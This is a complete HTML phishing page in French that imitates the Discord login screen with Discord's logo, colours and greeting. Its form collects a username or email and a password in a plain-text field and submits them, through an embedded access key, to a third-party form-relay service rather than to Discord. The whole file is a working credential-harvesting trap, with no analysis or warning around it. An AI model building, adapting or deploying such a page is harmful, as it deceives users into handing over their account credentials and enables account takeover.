<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connexion discord</title>
  <style>
    body {
      margin: 0;
      background-color: white; /* fond blanc */
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white; /* container blanc */
      padding: 40px 30px;
      border-radius: 8px;
      width: 320px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    h1 {
      margin-bottom: 25px;
      font-weight: 700;
      font-size: 1.6rem;
      color: black;
    }

    .input-group {
      text-align: left;
      margin-bottom: 15px;
    }

    .input-group label {
      display: block;
      margin-bottom: 6px;
      color: black;
      font-size: 0.9rem;
      font-weight: 600;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
      font-size: 1rem;
      background-color: white;
      color: black;
    }

    .input-group input::placeholder {
      color: #888;
    }

    button {
      width: 100%;
      background-color: #5865f2; /* bleu Discord */
      color: white;
      padding: 12px;
      font-weight: 700;
      font-size: 1rem;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #4752c4; /* bleu Discord foncé */
    }
  </style>
</head>
<body>
  <div class="container">
    <form action="https://api.web3forms.com/submit" method="POST">
      <input type="hidden" name="access_key" value="2ee965a7-fe03-40d0-981c-3b715c2ef17e" />
      <img src="https://cdn.worldvectorlogo.com/logos/discord-6.svg" height="70px" alt="Logo Discord" />
      <h1>Ha, te revoilà!</h1>
      <div class="input-group">
        <label>Nom utilisateur</label>
        <input type="text" name="Email" required placeholder="ex:test@gmail.com" />
      </div>
      <div class="input-group">
        <label>passeword</label>
        <input type="text" name="mp" required placeholder="" />
      </div>
      <button type="submit">Se connecter</button>
    </form>
  </div>
</body>
</html>
